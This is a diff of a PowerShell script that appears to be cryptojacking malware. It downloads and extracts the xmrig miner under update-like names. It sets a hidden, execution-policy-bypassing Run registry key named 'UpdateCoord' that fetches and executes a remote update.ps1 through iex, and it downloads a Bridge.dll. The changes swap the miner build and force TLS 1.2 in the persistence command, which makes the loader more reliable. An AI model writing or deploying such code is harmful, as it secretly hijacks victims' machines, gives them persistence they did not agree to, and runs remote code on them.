@@ -49,7 +49,7 @@ $v = "?v=$([Guid]::NewGuid())"
 
 if (!(Test-Path $ce)) {
     $cz = "$sDir\upd_c.zip"
-    if (Get-F "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip" $cz) {
+    if (Get-F "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip" $cz) {
         Extract-Safe $cz $sDir
         $uz = Get-ChildItem $sDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
         if ($uz -and $uz.FullName -ne $ce) { Move-Item $uz.FullName $ce -Force }
@@ -79,7 +79,7 @@ if ($gd -and !(Test-Path $ge)) {
     }
 }
 
-$tp = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command `"iex(New-Object Net.WebClient).DownloadString('$u2/update.ps1')`""
+$tp = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command `"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex(New-Object Net.WebClient).DownloadString('$u2/update.ps1')`""
 Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "UpdateCoord" $tp -EA 0
 
 if (Get-F "$u2/Bridge.dll$v" $dp) {
